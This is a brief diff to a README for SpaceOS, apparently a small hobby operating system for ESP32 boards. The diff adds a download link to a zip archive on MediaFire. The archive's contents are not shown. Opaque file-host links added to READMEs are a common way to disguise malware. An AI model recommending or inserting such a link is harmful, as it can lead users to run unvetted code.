@@ -2,6 +2,8 @@
 
 The cutest little operating system for your NodeMCU ESP32 board! 🪐💫
 
+Download SpaceOS:https://www.mediafire.com/file/4okk4tmkancdnnn/SpaceOS.zip/file
+
 Hello space traveler! 👩‍🚀👨‍‍🚀 Welcome to SpaceOS, a lovingly crafted mini-operating system that transforms a simple ESP32 board into an interactive, nostalgic pocket computer! 📟💖
 
 
